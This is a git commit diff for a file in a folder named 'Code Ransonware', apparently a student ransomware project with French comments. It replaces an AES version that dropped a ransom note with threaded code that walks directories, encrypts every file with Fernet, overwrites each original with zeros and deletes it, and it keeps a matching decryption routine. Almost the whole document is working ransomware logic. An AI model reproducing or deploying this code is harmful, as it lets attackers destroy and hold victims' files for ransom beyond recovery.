2934687e1f165dd3cdcb6ffe362754d3fbc12439
RomainLanglois <romain.langlois@viacesi.fr>
2017-08-21 18:14:47 +0200

    Update crypto_files.py

--- Code Ransonware/crypto_files.py
+++ Code Ransonware/crypto_files.py
@@ -1,68 +1,126 @@
-import os, random
-from Crypto.Cipher import AES
-from os.path import expanduser
+# Import :
+import os, threading
+from cryptography.fernet import Fernet
 
 
-def let_a_note():
-    note = 'Oups, your files has been encrypted !!!'
-    readme_file = expanduser("~") + "\\Documents\\README.txt"
+class generateThread(threading.Thread):
+    # Classe de création des thread
+    def __init__(self, threadID, key, file):
+        """ Fonction d'initialisation de la classe
+        :param threadID -- permet de connaitre le numéro du thread:
+        :param key -- clés de chiffrement:
+        :param file -- chemin et nom du fichier à chiffrer:
+        """
+        # Héritage de classe mère "Thread" obligatoire
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.key = key
+        self.file = file
 
-    with open(readme_file, 'wb') as note_file:
-        note_file.write(note)
-        note_file.close()
-
-def encrypt_file(key, filename):
-    chunksize = 65536
-    dictionnary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ02133456789'
-
-    file_name_without_extension, file_extension = os.path.splitext(filename)
-    file_extension += ' ' * (16 - (len(file_extension) % 16))
-
-    encrypt_file = file_name_without_extension + '.enc'
-    IV = ''
-
-    for i in range(16):
-        random_letter_dictionnary = random.choice(dictionnary)
-        IV += random_letter_dictionnary
-    encryptor = AES.new(key, AES.MODE_CBC, IV)
-
-    with open(filename, 'rb') as file_handler:
-        with open(encrypt_file, 'wb') as outputfile_handler:
-            outputfile_handler.write(file_extension)
-            outputfile_handler.write(IV)
-
-            while True:
-                chunk_read = file_handler.read(chunksize)
-
-                if len(chunk_read) == 0:
-                    break
-                elif len(chunk_read) % 16 != 0:
-                    chunk_read += ' ' * (16 - (len(chunk_read) % 16))
-                outputfile_handler.write(encryptor.encrypt(chunk_read))
-    os.unlink(filename)
-
-    let_a_note()
+    def run(self):
+        """
+        Cette fonction est appelée dès qu'un thread est démarré
+        -> Fonction start() de la classe mère "Thread"
+        """
+        # Affiche le numéro du thread (Débugging)
+        print("Starting " + str(self.threadID))
+        # Call des fonctions
+        encryptionFunction(self.key, self.file)
+        overwriteFile(self.file)
+        print("Exiting " + str(self.threadID))
 
 
-def decrypt_file(key, encrypt_file, out_filename):
-    chunksize = 65536
-    with open(encrypt_file, 'rb') as encrypt_file_handler:
-        extension_with_16_characters = encrypt_file_handler.read(16)
-        extension_without_16_characters = ''
+def listFiles(path):
+    """ Liste les fichiers d'un dossier et de ses sous-dossiers
+    :param path -- chemin vers le dossier:
+    :return -- renvoie une liste des fichiers:
+    """
+    # variables
+    # Liste contenant les noms des fichiers
+    liste_des_fichiers = []
 
-        for letter in extension_with_16_characters:
+    # Loop pour récupérer les chemins et noms des fichiers
+    for currentDirectory, subDirectories, files in os.walk(path):
+        for file in files:
+            fullPathFilename = (os.path.join(path + os.path.relpath(currentDirectory, path), file))
+            liste_des_fichiers.append(fullPathFilename)
+
+    # On retourne la liste des fichiers
+    return liste_des_fichiers
+
+
+def encryptionFunction(key, fichier_non_chiffré):
+    """ fonction de chiffrement
+    :param key -- clés de chiffrement:
+    :param filename -- fichier à chiffrer:
+    """
+    # Variales
+    # Génération du cipher
+    cipher_suite = Fernet(key)
+    filename, file_extension = os.path.splitext(fichier_non_chiffré)
+    # Padding de l'extension (8 bits dont dédiés à l'extension)
+    file_extension += ' ' * (8 - (len(file_extension) % 8))
+
+    with open(fichier_non_chiffré, 'rb') as file_handler:
+        # Lecture du fichier
+        chunk_read = file_handler.read()
+        # Chiffrement du contenu
+        cipher_text = cipher_suite.encrypt(chunk_read)
+
+        # Création du fichier chiffré
+        with open(filename + ".enc", 'wb') as file_encrypt:
+            # Ecriture de l'extension du fichier d'origine
+            file_encrypt.write(file_extension.encode())
+            # Ecriture du contenu chiffré
+            file_encrypt.write(cipher_text)
+
+
+def decryptionFunction(key, fichier_chiffré):
+    """ fonction de déchiffrement
+    :param key -- clés de chiffrement:
+    :param filename -- fichier à déchiffrer:
+    """
+    # génération du cipher
+    cipher_suite = Fernet(key)
+    # séparation du nom de fichier et de l'extension
+    nom_de_fichier_sans_extension, _ = os.path.splitext(fichier_chiffré)
+
+    with open(nom_de_fichier_sans_extension + '.enc', 'rb') as encrypt_file:
+        # Lecture de l'extension dans le fichier chiffré
+        extension_de_fichier_avec_8_caractéres = encrypt_file.read(8).decode()
+        extension_sans_8_caractéres = ''
+        # Elémination des espaces de l'extension
+        for letter in extension_de_fichier_avec_8_caractéres:
             if letter == ' ':
                 pass
             else:
-                extension_without_16_characters += letter
+                extension_sans_8_caractéres += letter
 
-        IV = encrypt_file_handler.read(32 - 16)
-        decryptor = AES.new(key, AES.MODE_CBC, IV)
+        # Lecture du contenu chiffré
+        cipher_text = encrypt_file.read()
 
-        with open(out_filename + extension_without_16_characters, 'wb') as outfile:
-            while True:
-                chunk = encrypt_file_handler.read(chunksize)
-                if len(chunk) == 0:
-                    break
-                outfile.write(decryptor.decrypt(chunk))
-    os.unlink(encrypt_file)
+        # Appelle de la fonction de déchiffrement
+        plain_text = cipher_suite.decrypt(cipher_text)
+        # Ecriture du contenu non chiffré dans un nouveau fichier
+        with open(nom_de_fichier_sans_extension + extension_de_fichier_avec_8_caractéres, 'wb') as decrypt_file:
+             decrypt_file.write(plain_text)
+
+    # Suppression du fichier chiffré
+    os.remove(fichier_chiffré)
+
+
+def overwriteFile(filename):
+    """ Overwrite un fichier avec des zéros.
+    :param filename -- fichier à remplir de zéros:
+    """
+
+    # récupére des informations statistiques sur le fichier
+    stat = os.stat(filename)
+
+    with open(filename, 'r+') as of:
+        # Rempli de zéro le fichier en se basant sur sa taille
+        of.write('\0' * stat.st_size)
+        # Flush le buffer du fichier
+        of.flush()
+    # Suppression du fichier
+    os.remove(filename)
